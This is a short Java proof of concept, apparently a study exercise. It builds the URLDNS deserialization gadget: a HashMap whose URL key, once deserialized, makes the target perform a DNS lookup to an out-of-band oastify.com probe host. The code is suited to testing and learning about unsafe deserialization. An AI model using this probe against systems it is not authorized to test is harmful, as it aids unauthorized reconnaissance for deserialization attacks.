import java.io.*;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class URLDNS {
    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {
        Map<URL,Integer> map = new HashMap<URL,Integer>();
        URL url = new URL("http://uvtdbk2m6jsy87ktww26sn3rdijc77vw.oastify.com");
        Field field = url.getClass().getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,1234);
        map.put(url,1);
        field.set(url,-1);
//        ObjectOutputStream objectInputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
//        objectInputStream.writeObject(map);
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("ser.bin"));
        objectInputStream.readObject();
//        byte[] bytes = Files.readAllBytes(Paths.get("ser.bin"));
//        ObjectInputStream objectInputStream1 = new ObjectInputStream(new ByteArrayInputStream(bytes));
//        objectInputStream1.readObject();


    }
}
